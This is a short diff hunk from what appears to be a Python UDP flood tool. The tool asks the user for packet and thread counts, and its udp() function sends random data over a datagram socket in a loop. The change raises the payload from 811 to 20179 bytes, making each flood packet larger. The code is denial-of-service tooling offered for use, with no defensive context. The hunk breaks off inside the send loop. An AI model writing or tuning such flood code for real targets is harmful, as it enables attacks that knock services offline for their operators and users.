@@ -217,7 +217,7 @@ times = int(input(" \033[94mPackets \033[1;31;40m      ====> : "))
 threads = int(input("\033[94m Threads \033[1;31;40m    ====> : "))
 
 def udp():
-	data = random._urandom(811)
+	data = random._urandom(20179)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
